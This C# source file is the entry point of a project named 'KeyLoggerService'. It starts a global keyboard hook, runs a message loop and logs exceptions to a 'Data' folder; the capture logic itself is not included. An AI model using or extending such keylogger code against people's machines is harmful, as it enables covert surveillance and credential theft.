using KeyLoggerService.HookSetting.HookManager;
using System.Windows.Forms;
internal class Program
{
    private static async Task Main(string[] args)
    {
        var h = new KeyHookSet();

        try
        {
            string ProjDirectory
                = Directory.GetCurrentDirectory();

            if (!Directory.Exists(Path.Combine(ProjDirectory, "Data")))
            {
                Directory.CreateDirectory(Path.Combine(ProjDirectory, "Data"));
            }

            _ = h.Start();

            Application.Run();

            _ = h.ShutdownHook();

        }
        catch (Exception ex)
        {
            File.AppendAllText(Path.Combine(Directory.GetCurrentDirectory(), "Data", "ExeptionLog.txt"), ex.Source + "       " + ex.Message + "     " + ex.StackTrace);
            await h.ShutdownHook();
            throw;
        }
    }
}